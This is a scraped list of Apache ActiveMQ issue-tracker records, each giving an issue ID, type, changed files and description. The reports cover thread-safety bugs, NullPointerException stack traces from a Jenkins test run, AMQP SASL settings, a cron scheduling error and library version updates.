texts:Message ack compaction needs to acquire the checkpoint lock
The AckCompactionRunner task needs to acquire the checkpiont lock to prevent other threads from running a checkpoint while the task is running. Normally this task runs on the same executor as the checkpoint task so the ack compaction task wouldn"t run at the same time as the checkpoint task as they are processed one at a time.However, there are two cases where this isn"t always true.  First, the checkpoint() method is public and can be called through the PersistenceAdapter interface by someone at the same time the ack compaction is running.  Second, a checkpoint is called during shutdown without using the executor and could also run while the ack compaction is running.The main reason for this fix is because when doing some testing I was seeing an occasional error from journal.getNextLocation() in the forwardAllAcks method because a journal file was missing which I believe was cleaned up by the cleanup task.  I was testing scenarios such as shutdown and also manually triggering the task at the same time as an ack compaction.Also, while we are at it, we should have a try/catch around the journal.getNextLocation calls to catch any IOException so we can abort gracefully.
issueID:AMQ-6290
type:Bug
changed files:
texts:JMS Pool reconnection logic not always reliable
The reconnect on exception configuration setting in the JMS pool relies on an exception being thrown from the ExceptionListener to signal a reconnect needed.  This can miss an exception thrown from the start method when the initial connection attempt is being made and things like security exceptions trigger connection failure.  Even if the exception is given to the listener it happens asynchronously which means the pool will be handling out known broken connection instances until the listener gets around to running the close logic.For the start method we should also be handling the exception in ConnectionPool and checking for the reconnect on exception flag to indicate a failure has occurred and the Connection should be closed and evicted from the pool.
issueID:AMQ-6291
type:Bug
changed files:TcpTransportServer.java
texts:Thread unsafe code in TcpTransportServer can lead to NPE or other errors on start / stop
Access to several variable in TcpTransportServer is done in an unsafe manner which can lead to NPE or other data race exceptions on start or stop, one example below:Error Messagegot: <false>, expected: is <true>Stacktraceorg.junit.AssumptionViolatedException: got: <false>, expected: is <true> at org.junit.Assume.assumeThat(Assume.java:95) at org.junit.Assume.assumeTrue(Assume.java:41) at org.apache.activemq.transport.stomp.StompMaxFrameSizeTest.testOversizedActionOnNioSocket(StompMaxFrameSizeTest.java:184)Standard Output2016-05-11 23:32:34,331 [main           ] - INFO  StompTestSupport               - ========== start testOversizedActionOnNioSocket[0] ==========2016-05-11 23:32:34,339 [main           ] - DEBUG StompTestSupport               - Using stomp port 381982016-05-11 23:32:34,345 [main           ] - DEBUG StompTestSupport               - Using stomp+ssl port 542022016-05-11 23:32:34,346 [main           ] - DEBUG StompTestSupport               - Using stomp+nio port 568162016-05-11 23:32:34,350 [main           ] - DEBUG StompTestSupport               - Using stomp+nio+ssl port 500132016-05-11 23:32:34,353 [main           ] - WARN  BrokerService                  - Memory Usage for the Broker (1024mb) is more than the maximum available for the JVM: 891 mb - resetting to 70% of maximum available: 623 mb2016-05-11 23:32:34,365 [main           ] - INFO  BrokerService                  - Using Persistence Adapter: MemoryPersistenceAdapter2016-05-11 23:32:34,370 [main           ] - INFO  BrokerService                  - Apache ActiveMQ 5.14.0-SNAPSHOT (localhost, ID:jenkins-test-39e-56729-1463009553425-0:4) is starting2016-05-11 23:32:34,374 [main           ] - INFO  TransportServerThreadSupport   - Listening for connections at: stomp://jenkins-test-39e:38198?wireFormat.maxDataLength=102400&wireFormat.maxFrameSize=655362016-05-11 23:32:34,374 [main           ] - INFO  TransportConnector             - Connector stomp://jenkins-test-39e:38198?wireFormat.maxDataLength=102400&wireFormat.maxFrameSize=65536 started2016-05-11 23:32:34,375 [main           ] - INFO  TransportServerThreadSupport   - Listening for connections at: stomp+ssl://jenkins-test-39e:54202?wireFormat.maxDataLength=102400&wireFormat.maxFrameSize=655362016-05-11 23:32:34,376 [main           ] - INFO  TransportConnector             - Connector stomp+ssl://jenkins-test-39e:54202?wireFormat.maxDataLength=102400&wireFormat.maxFrameSize=65536 started2016-05-11 23:32:34,377 [main           ] - INFO  TransportServerThreadSupport   - Listening for connections at: stomp+nio://jenkins-test-39e:56816?wireFormat.maxDataLength=102400&wireFormat.maxFrameSize=655362016-05-11 23:32:34,377 [main           ] - INFO  TransportConnector             - Connector stomp+nio://jenkins-test-39e:56816?wireFormat.maxDataLength=102400&wireFormat.maxFrameSize=65536 started2016-05-11 23:32:34,379 [main           ] - INFO  TransportServerThreadSupport   - Listening for connections at: stomp+nio+ssl://jenkins-test-39e:50013?wireFormat.maxDataLength=102400&wireFormat.maxFrameSize=655362016-05-11 23:32:34,379 [main           ] - INFO  TransportConnector             - Connector stomp+nio+ssl://jenkins-test-39e:50013?wireFormat.maxDataLength=102400&wireFormat.maxFrameSize=65536 started2016-05-11 23:32:34,380 [main           ] - INFO  BrokerService                  - Apache ActiveMQ 5.14.0-SNAPSHOT (localhost, ID:jenkins-test-39e-56729-1463009553425-0:4) started2016-05-11 23:32:34,380 [main           ] - INFO  BrokerService                  - For help or more information please see: http://activemq.apache.org2016-05-11 23:32:34,380 [main           ] - WARN  BrokerService                  - Temporary Store limit is 51200 mb (current store usage is 0 mb). The data directory: /home/jenkins/jenkins-slave/workspace/ActiveMQ-Java7/activemq-stomp/target only has 14884 mb of usable space. - resetting to maximum available disk space: 14884 mb2016-05-11 23:32:34,381 [main           ] - INFO  BrokerService                  - Apache ActiveMQ 5.14.0-SNAPSHOT (localhost, ID:jenkins-test-39e-56729-1463009553425-0:4) is shutting down2016-05-11 23:32:34,381 [main           ] - INFO  TransportConnector             - Connector stomp://jenkins-test-39e:38198?wireFormat.maxDataLength=102400&wireFormat.maxFrameSize=65536 stopped2016-05-11 23:32:34,382 [main           ] - INFO  TransportConnector             - Connector stomp+ssl://jenkins-test-39e:54202?wireFormat.maxDataLength=102400&wireFormat.maxFrameSize=65536 stopped2016-05-11 23:32:34,383 [main           ] - ERROR StompNIOTransportFactory$1     - Could not stop service: stomp+nio://0.0.0.0:0?wireFormat.maxDataLength=102400&wireFormat.maxFrameSize=65536. Reason: java.lang.NullPointerExceptionjava.lang.NullPointerException at java.nio.channels.spi.AbstractSelectableChannel.removeKey(AbstractSelectableChannel.java:128) at java.nio.channels.spi.AbstractSelector.deregister(AbstractSelector.java:185) at sun.nio.ch.EPollSelectorImpl.implClose(EPollSelectorImpl.java:147) at sun.nio.ch.SelectorImpl.implCloseSelector(SelectorImpl.java:114) at java.nio.channels.spi.AbstractSelector.close(AbstractSelector.java:108) at org.apache.activemq.transport.tcp.TcpTransportServer.doStop(TcpTransportServer.java:476) at org.apache.activemq.util.ServiceSupport.stop(ServiceSupport.java:71) at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41) at org.apache.activemq.broker.TransportConnector.stop(TransportConnector.java:283) at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41) at org.apache.activemq.broker.BrokerService.stopAllConnectors(BrokerService.java:2208) at org.apache.activemq.broker.BrokerService.stop(BrokerService.java:819) at org.apache.activemq.transport.stomp.StompTestSupport.stopBroker(StompTestSupport.java:177) at org.apache.activemq.transport.stomp.StompTestSupport.tearDown(StompTestSupport.java:116) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:606) at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:50) at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12) at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:47) at org.junit.internal.runners.statements.RunAfters.evaluate(RunAfters.java:33) at org.junit.rules.TestWatcher$1.evaluate(TestWatcher.java:55) at org.junit.rules.RunRules.evaluate(RunRules.java:20) at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:325) at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:78) at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:57) at org.junit.runners.ParentRunner$3.run(ParentRunner.java:290) at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:71) at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:288) at org.junit.runners.ParentRunner.access$000(ParentRunner.java:58) at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:268) at org.junit.runners.ParentRunner.run(ParentRunner.java:363) at org.junit.runners.Suite.runChild(Suite.java:128) at org.junit.runners.Suite.runChild(Suite.java:27) at org.junit.runners.ParentRunner$3.run(ParentRunner.java:290) at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:71) at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:288) at org.junit.runners.ParentRunner.access$000(ParentRunner.java:58) at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:268) at org.junit.runners.ParentRunner.run(ParentRunner.java:363) at org.apache.maven.surefire.junit4.JUnit4Provider.execute(JUnit4Provider.java:264) at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:153) at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:124) at org.apache.maven.surefire.booter.ForkedBooter.invokeProviderInSameClassLoader(ForkedBooter.java:200) at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:153) at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:103)2016-05-11 23:32:34,385 [main           ] - ERROR StompNIOTransportFactory$1     - Could not stop service: stomp+nio://0.0.0.0:0?wireFormat.maxDataLength=102400&wireFormat.maxFrameSize=65536. Reason: java.lang.NullPointerExceptionjava.lang.NullPointerException at java.nio.channels.spi.AbstractSelectableChannel.removeKey(AbstractSelectableChannel.java:128) at java.nio.channels.spi.AbstractSelector.deregister(AbstractSelector.java:185) at sun.nio.ch.EPollSelectorImpl.implClose(EPollSelectorImpl.java:147) at sun.nio.ch.SelectorImpl.implCloseSelector(SelectorImpl.java:114) at java.nio.channels.spi.AbstractSelector.close(AbstractSelector.java:108) at org.apache.activemq.transport.tcp.TcpTransportServer.doStop(TcpTransportServer.java:476) at org.apache.activemq.util.ServiceSupport.stop(ServiceSupport.java:71) at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41) at org.apache.activemq.broker.TransportConnector.stop(TransportConnector.java:283) at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41) at org.apache.activemq.broker.BrokerService.stopAllConnectors(BrokerService.java:2208) at org.apache.activemq.broker.BrokerService.stop(BrokerService.java:819) at org.apache.activemq.transport.stomp.StompTestSupport.stopBroker(StompTestSupport.java:177) at org.apache.activemq.transport.stomp.StompTestSupport.tearDown(StompTestSupport.java:116) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:606) at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:50) at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12) at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:47) at org.junit.internal.runners.statements.RunAfters.evaluate(RunAfters.java:33) at org.junit.rules.TestWatcher$1.evaluate(TestWatcher.java:55) at org.junit.rules.RunRules.evaluate(RunRules.java:20) at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:325) at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:78) at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:57) at org.junit.runners.ParentRunner$3.run(ParentRunner.java:290) at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:71) at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:288) at org.junit.runners.ParentRunner.access$000(ParentRunner.java:58) at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:268) at org.junit.runners.ParentRunner.run(ParentRunner.java:363) at org.junit.runners.Suite.runChild(Suite.java:128) at org.junit.runners.Suite.runChild(Suite.java:27) at org.junit.runners.ParentRunner$3.run(ParentRunner.java:290) at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:71) at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:288) at org.junit.runners.ParentRunner.access$000(ParentRunner.java:58) at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:268) at org.junit.runners.ParentRunner.run(ParentRunner.java:363) at org.apache.maven.surefire.junit4.JUnit4Provider.execute(JUnit4Provider.java:264) at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:153) at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:124) at org.apache.maven.surefire.booter.ForkedBooter.invokeProviderInSameClassLoader(ForkedBooter.java:200) at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:153) at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:103)2016-05-11 23:32:34,386 [main           ] - ERROR ManagedTransportConnector      - Could not stop service: stomp+nio://jenkins-test-39e:56816?wireFormat.maxDataLength=102400&wireFormat.maxFrameSize=65536. Reason: java.lang.NullPointerExceptionjava.lang.NullPointerException at java.nio.channels.spi.AbstractSelectableChannel.removeKey(AbstractSelectableChannel.java:128) at java.nio.channels.spi.AbstractSelector.deregister(AbstractSelector.java:185) at sun.nio.ch.EPollSelectorImpl.implClose(EPollSelectorImpl.java:147) at sun.nio.ch.SelectorImpl.implCloseSelector(SelectorImpl.java:114) at java.nio.channels.spi.AbstractSelector.close(AbstractSelector.java:108) at org.apache.activemq.transport.tcp.TcpTransportServer.doStop(TcpTransportServer.java:476) at org.apache.activemq.util.ServiceSupport.stop(ServiceSupport.java:71) at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41) at org.apache.activemq.broker.TransportConnector.stop(TransportConnector.java:283) at org.apache.activemq.util.ServiceStopper.stop(ServiceStopper.java:41) at org.apache.activemq.broker.BrokerService.stopAllConnectors(BrokerService.java:2208) at org.apache.activemq.broker.BrokerService.stop(BrokerService.java:819) at org.apache.activemq.transport.stomp.StompTestSupport.stopBroker(StompTestSupport.java:177) at org.apache.activemq.transport.stomp.StompTestSupport.tearDown(StompTestSupport.java:116) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:606) at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:50) at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12) at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:47) at org.junit.internal.runners.statements.RunAfters.evaluate(RunAfters.java:33) at org.junit.rules.TestWatcher$1.evaluate(TestWatcher.java:55) at org.junit.rules.RunRules.evaluate(RunRules.java:20) at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:325) at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:78) at org.junit.runners.BlockJUnit4ClassRunner.runChild(BlockJUnit4ClassRunner.java:57) at org.junit.runners.ParentRunner$3.run(ParentRunner.java:290) at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:71) at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:288) at org.junit.runners.ParentRunner.access$000(ParentRunner.java:58) at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:268) at org.junit.runners.ParentRunner.run(ParentRunner.java:363) at org.junit.runners.Suite.runChild(Suite.java:128) at org.junit.runners.Suite.runChild(Suite.java:27) at org.junit.runners.ParentRunner$3.run(ParentRunner.java:290) at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:71) at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:288) at org.junit.runners.ParentRunner.access$000(ParentRunner.java:58) at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:268) at org.junit.runners.ParentRunner.run(ParentRunner.java:363) at org.apache.maven.surefire.junit4.JUnit4Provider.execute(JUnit4Provider.java:264) at org.apache.maven.surefire.junit4.JUnit4Provider.executeTestSet(JUnit4Provider.java:153) at org.apache.maven.surefire.junit4.JUnit4Provider.invoke(JUnit4Provider.java:124) at org.apache.maven.surefire.booter.ForkedBooter.invokeProviderInSameClassLoader(ForkedBooter.java:200) at org.apache.maven.surefire.booter.ForkedBooter.runSuitesInProcess(ForkedBooter.java:153) at org.apache.maven.surefire.booter.ForkedBooter.main(ForkedBooter.java:103)2016-05-11 23:32:34,388 [main           ] - INFO  TransportConnector             - Connector stomp+nio+ssl://jenkins-test-39e:50013?wireFormat.maxDataLength=102400&wireFormat.maxFrameSize=65536 stopped2016-05-11 23:32:34,389 [main           ] - INFO  BrokerService                  - Apache ActiveMQ 5.14.0-SNAPSHOT (localhost, ID:jenkins-test-39e-56729-1463009553425-0:4) uptime 0.036 seconds2016-05-11 23:32:34,389 [main           ] - INFO  BrokerService                  - Apache ActiveMQ 5.14.0-SNAPSHOT (localhost, ID:jenkins-test-39e-56729-1463009553425-0:4) is shutdownStandard ErrorException in thread "ActiveMQ Transport Server: stomp+nio://0.0.0.0:0?wireFormat.maxDataLength=102400&wireFormat.maxFrameSize=65536" java.nio.channels.ClosedSelectorException at sun.nio.ch.EPollSelectorImpl.putEventOps(EPollSelectorImpl.java:185) at sun.nio.ch.ServerSocketChannelImpl.translateAndSetInterestOps(ServerSocketChannelImpl.java:361) at sun.nio.ch.SelectionKeyImpl.nioInterestOps(SelectionKeyImpl.java:105) at sun.nio.ch.SelectionKeyImpl.interestOps(SelectionKeyImpl.java:83) at sun.nio.ch.SelectorImpl.register(SelectorImpl.java:135) at java.nio.channels.spi.AbstractSelectableChannel.register(AbstractSelectableChannel.java:209) at java.nio.channels.SelectableChannel.register(SelectableChannel.java:277) at org.apache.activemq.transport.tcp.TcpTransportServer.run(TcpTransportServer.java:310) at java.lang.Thread.run(Thread.java:745)
issueID:AMQ-6292
type:Improvement
changed files:MessageDatabase.java
texts:ACK rewrite task does unnecessary syncs
When rewriting acks from an older journal to a new one the rewrite task forces a disk sync on each ack written, should instead just queue the write and allow the batch write to sync when it is full or the appender is closed.
issueID:AMQ-6293
type:Bug
changed files:
texts:Queue destination statistics can be inaccurate with a purge
Recently I have been seeing some negative message counts from the destinationStatistics message counter of a Queue.  The dequeue counts also seem to be wrong as well.  This is hard to reproduce as it happens rarely, but running a purge while there are consumers online acking seems to be an occasional cause. The removeMessage method in a Queue can be called more than once for the same message if an ack comes in at the same time as a purge.  (This is because messages are prefetched so they can be acked even while they are purged) Taking a closer look, the broker handles duplicate calls ok in most cases but there are two areas that need to be fixed.First, there is a race condition in the dropMessage() method in Queue.  It checks if the message is dropped before continuing with the drop.  This is not thread safe because the two methods calls are not synchronized together. I was able to show negative counts by introducing a small amount of latency between those two calls during a test.  There needs to be some synchronization done here to prevent the counts from getting out of sync.Second, the dequeue counter needs to be moved out of the removeMessage() method and to the dropMessage() method so it can be protected by the same sync and only incremented when a message is dropped to prevent duplicate counts.
issueID:AMQ-6297
type:Bug
changed files:MulticastDiscoveryAgent.java
texts:NullPointerException in MulticastDiscoveryAgent.findNetworkInterface
Broker configuration in spring:    <amq:broker useJmx="true" persistent="true" schedulerSupport="true" brokerName="hardcollection"                dataDirectoryFile="file:${catalina.base}/active-mq">        <amq:networkConnectors>            <amq:networkConnector uri="${activemq.network.connector.uri}" />        </amq:networkConnectors>        <amq:transportConnectors>            <amq:transportConnector uri="${activemq.transport.connector.uri}" discoveryUri="${activemq.transport.connector.discovery.uri}"/>        </amq:transportConnectors>    </amq:broker>Propertiesactivemq.network.connector.uri=multicast://defaultactivemq.transport.connector.uri=tcp://localhost:0activemq.transport.connector.discovery.uri=multicast://defaultException throwed when broker is starting.Caused by: java.lang.NullPointerException: null at org.apache.activemq.transport.discovery.multicast.MulticastDiscoveryAgent.findNetworkInterface(MulticastDiscoveryAgent.java:351) at org.apache.activemq.transport.discovery.multicast.MulticastDiscoveryAgent.start(MulticastDiscoveryAgent.java:324) at org.apache.activemq.broker.TransportConnector.start(TransportConnector.java:253) at org.apache.activemq.broker.BrokerService.startTransportConnector(BrokerService.java:2680) at org.apache.activemq.broker.BrokerService.startAllConnectors(BrokerService.java:2594) at org.apache.activemq.broker.BrokerService.doStartBroker(BrokerService.java:756) at org.apache.activemq.broker.BrokerService.startBroker(BrokerService.java:718) at org.apache.activemq.broker.BrokerService.start(BrokerService.java:621) at org.apache.activemq.broker.BrokerService.autoStart(BrokerService.java:575) at org.apache.activemq.broker.BrokerService.postConstruct(BrokerService.java:562) ... 69 common frames omitted
issueID:AMQ-6298
type:Bug
changed files:
texts:Incorrect Import-Package version range for org.springframework.osgi
In issue AMQ-5922, I supplied a patch that updated the OSGi version range inside activemq-osgi for Spring to include Spring 4.X. Unfortunately, I reordered the "org.springframework*" clause and this is causing the version range for Spring and Spring-DM classes to be set to "[3,5)".This is not a correct version range for Spring-DM since its releases only went from 1.0 to several 2.0 candidates.
issueID:AMQ-6299
type:Task
changed files:
texts:Update commons libraries to latest bugfix release versions
Update some commons deps that have later bugfix versions:    commons-beanutils-version -> 1.9.2    commons-io-version -> 2.5    commons-logging-version -> 1.2    commons-net-version -> 3.5
issueID:AMQ-6301
type:Improvement
changed files:
texts:Embed spring-dm in activemq-osgi to avoid loading spring-dm in Karaf
Embed spring-dm in activemq-osgi to avoid loading spring-dm in KarafIn commit 3a6d67e8f95320bea91b7c7106173c9b34773bc5, a test was fixed in issue AMQ-4727 by reusing the spring-dm OsgiBundleXmlApplicationContext class inside the ActiveMQServiceFactory managed service factory.To satisfy the import packages for activemq-osgi, the "spring-dm" Karaf feature was added to the main "activemq-client" feature.This is problematic because loading the "spring-dm" Karaf feature enables the Spring DM deployer. This deployer is unnecessary in environments that rely on Blueprint or CDI wiring and it may unexpectedly activate Spring DM bundles in those environments. Because spring-dm was compiled against older versions of Spring 3.0 and 3.1, it can also cause older versions of Spring features to be loaded into the container.To avoid using the ‘spring-dm’ Karaf feature to provide the classes, I propose embedding the spring-dm bundles inside activemq-osgi. Since they are only used as library code to provide the BundleContext when parsing the BrokerService context, they can be embedded safely without any dependency issues.This is the root cause of the following issue:http://karaf.922171.n3.nabble.com/Karaf-4-0-3-unable-to-start-bundle-activemq-osgi-5-13-0-td4044640.html
issueID:AMQ-6303
type:Bug
changed files:MessageDatabase.java
texts:Message ack rewrite does not always set the right journal file type code
The type code value is not always set correctly for journal files that are rewritten for ack compaction.  This value is transient so we need to make sure it"s set immediately after allocating the new file and also on replay.
issueID:AMQ-6304
type:Improvement
changed files:
texts:Container-id field blank on sending an AMQP 1.0 open frame to the client
Attaching an AMQP 1.0 receiver client, the container-id field in the open frame is blank. It could be set with the broker id or broker name at least.
issueID:AMQ-6305
type:Bug
changed files:
texts:AMQP: Drain requests can go unaswered in certain cases.
In some cases when an AMQP client issues a flow that indicates a request to drain off credit or pull some amount of messages the broker can fail to respond due to interactions between the via of credit and other factors like prefetch extension which can leave a message queued on link and not be accounted for.
issueID:AMQ-6309
type:Task
changed files:
texts:AMQP: Static code analysis of activemq-amqp
Perform a static code analysis of activemq-amqp and fix some minor issues that it shows.
issueID:AMQ-631
type:Task
changed files:
texts:verify that HttpsTransportBrokerTest won&#39;t hang on other environment
None
issueID:AMQ-6310
type:Bug
changed files:
texts:Certain VirtualTopic configurations no longer send messages to the correct queue
Several of our brokers have a VirtualTopic with the name VirtualTopic.> and a prefix of &#42;.&#42;..  The expected behavior would be that a message sent to VirtualTopic.A should be consumed on a queue with any pattern that matches &#42;.&#42;.VirtualTopic.A.For example, if a message is published to a topic called VirtualTopic.A, that would be consumed on queues Consumer.A.VirtualTopic.A and Subscriber.A.VirtualTopic.A.However, since the change made in AMQ-6058, it appears that, given the example above, neither queue receives the message.  This is because the change performs a startsWith comparison of the destination against the prefix, rather than a regex comparison.If there is a reason to prevent leading wildcards in the prefix, it should be documented, otherwise the sanity check in shouldDispatch(...) needs to be updated to handle it.
issueID:AMQ-6311
type:Bug
changed files:
texts:Typo in activemq unix script
Line 598 of the activemq script refers to a string: "checkfornotrunning"    elif [ "$CHECKRUNNING" = "checkfornotrunning" ];thenThat string should be what is passed to the invoke_task function on line 676:    invoke_task checknotforrunningNotice the location of "not" in the string is different.
issueID:AMQ-6317
type:Bug
changed files:
texts:ActiveMQ createSchemaStatements are not executed on init if a previous createSchemaStatement failed on execution
On init the DefaultJDBCAdapter.doCreateTables-method is executed. This provides the tables needed for ActiveMQ in persistent mode.The createSchemaStatements are executed within one SQL Statement. When one of the createSchemaStatements throws an SQLException (table already exists) the SQL Statement"s transaction is aborted and all following createSchemaStatements are ignored.This is unwanted behaviour as the comment on the code block states that new statements like for example "ALTER TABLE" (introduced in new versions of activemq) should be executed if the tables already exist.We had this issue when adding an extra createSchemaStatement for a JobScheduler table.
issueID:AMQ-6319
type:Improvement
changed files:
texts:AMQP: Make it easier to disable accepting non-SASL clients and add more tests.
Make it easier to turn off support for non-SASL AMQP clients via "wireFormat.allowNonSaslConnections=false" on the transportConnector URI and add some more tests for this area.
issueID:AMQ-632
type:Bug
changed files:VMTransportFactory.java
texts:TaskRunnerFactory from broker is not carried along to Broker-to-Broker connections
When trying to enable dispatchAsync for broker-to-broker connections (which, since I"ve not found a way to configure demandForwardingBridge in the broker XML, I had to hard code by setting the default value of dispatchAsync in DemandForwardingBridge.java), I found that the TaskRunnerFactory from the broker was not being carried through to the Network connections.I"m not sure if the way I fixed it is fully acceptable or not, however the attached VMTransportFactory.java seems to fix the issue.  I changed doCompositeConnect to call setTaskRunnerFactory on the newly created TransportConnector.The change is against SNAPSHOT 03/14/2006.
issueID:AMQ-6320
type:Task
changed files:AmqpWireFormat.java
texts:AMQP" Disable non-sasl client connects by default
Disable allowing non-SASL client connections be default and only accept clients via SASL authentication with anonymous SASL being the alternative to non-SASL.  Can be turned on via the configuration option on the TransportConnector URI:wireFormat.allowNonSaslConnections=true
issueID:AMQ-6322
type:Improvement
changed files:
texts:Introduce timeout in network bridge for waiting broker infos
At the moment the network bridge will wait indefinitely for broker infos when starting. In situations when remote broker gets unresponsive, it"s better to timeout and reconnect.
issueID:AMQ-6323
type:New Feature
changed files:
texts:Support reduceMemoryFootprint flag for Topics
Currently the reduceMemoryFootprint flag exists on a policy and can be used for Queues but not for Topics.  While the flag can be set for Topics, it doesn"t get applied anywhere.  We should be able to apply this flag for persistent messages just like we do for Queues so that the state can be cleared after the message has been marshalled to a byte sequence.  This will allow the broker to save memory and help prevent OOM errors because the memory usage counter only tracks the marshalled state of the message.
issueID:AMQ-6325
type:Bug
changed files:
texts:JMS Selector parsing will not fail if a valid selector is followed by invalid text
A JMS Selector which has a valid stem followed by invalid data will not cause a failure, and the selector will be parsed an executed as if only the valid stem were present.For example the selectora = 1 AMD  b = 2will be treated as if the selector wasa = 1
issueID:AMQ-6326
type:Task
changed files:
texts:AMQP: Update Proton to latest release
None
issueID:AMQ-6327
type:Bug
changed files:CronParser.java
texts:getNextScheduledTime() returns incorrect time when working with day of month
Given the following codeDateFormat format = new SimpleDateFormat("yyyy/MM/dd");try {  // cron, currentDate, expectedDate  String[][] tests = new String[][]{    { "0 0 1 * *", "2016/04/15", "2016/05/01" },    { "0 0 1,15 * *", "2016/04/15", "2016/05/01" },    { "0 0 1 * *", "2016/05/15", "2016/06/01" },    { "0 0 1,15 * *", "2016/05/15", "2016/06/01" },    { "0 0 1 * *", "2016/06/15", "2016/07/01" },    { "0 0 1,15 * *", "2016/06/15", "2016/07/01" },  };  String cron;  Date currentDate;  Date expectedDate;  Date nextDate;  for (int i = 0; i < tests.length; i++) {    cron = tests[i][0];    currentDate = format.parse(tests[i][1]);    expectedDate = format.parse(tests[i][2]);    nextDate = new Date(CronParser.getNextScheduledTime(cron, currentDate.getTime()));    System.out.println(String.format("CronParser.getNextScheduledTime("%s", "%s") == "%s" // Expected: "%s"", cron, currentDate, nextDate, expectedDate));  }} catch (Exception e) {  e.printStackTrace();}The output isCronParser.getNextScheduledTime("0 0 1 * *", "Fri Apr 15 00:00:00 UTC 2016") == "Wed Jun 01 00:00:00 UTC 2016" // Expected: "Sun May 01 00:00:00 UTC 2016"CronParser.getNextScheduledTime("0 0 1,15 * *", "Fri Apr 15 00:00:00 UTC 2016") == "Sun May 15 00:00:00 UTC 2016" // Expected: "Sun May 01 00:00:00 UTC 2016"CronParser.getNextScheduledTime("0 0 1 * *", "Sun May 15 00:00:00 UTC 2016") == "Wed Jun 01 00:00:00 UTC 2016" // Expected: "Wed Jun 01 00:00:00 UTC 2016"CronParser.getNextScheduledTime("0 0 1,15 * *", "Sun May 15 00:00:00 UTC 2016") == "Wed Jun 01 00:00:00 UTC 2016" // Expected: "Wed Jun 01 00:00:00 UTC 2016"CronParser.getNextScheduledTime("0 0 1 * *", "Wed Jun 15 00:00:00 UTC 2016") == "Mon Aug 01 00:00:00 UTC 2016" // Expected: "Fri Jul 01 00:00:00 UTC 2016"CronParser.getNextScheduledTime("0 0 1,15 * *", "Wed Jun 15 00:00:00 UTC 2016") == "Fri Jul 15 00:00:00 UTC 2016" // Expected: "Fri Jul 01 00:00:00 UTC 2016"When given 1 for the day of month it"s returning 1 month to many every other monthWhen given 1,15 for the day of month it"s returning the correct month but incorrect day of month every other monthI"ve tested this on both v5.12.0 and v5.13.3
issueID:AMQ-633
type:New Feature
changed files:
texts:Per Destination Memory Usage Limit
Using a global broker memory limit can cause deadlocks. If the memory limit is hit on a broker the send to that broker is blocked. So if I consume a message of the broker and then produce another message on to it that will block cauing a deadlock because I can never consume the message. Having per destination limits will allow me to produce to a different destination with out blocking and messages being consumed from the blocked destination.
issueID:AMQ-6331
type:Improvement
changed files:
texts:Honor excluded destinations in static routing on network connectors
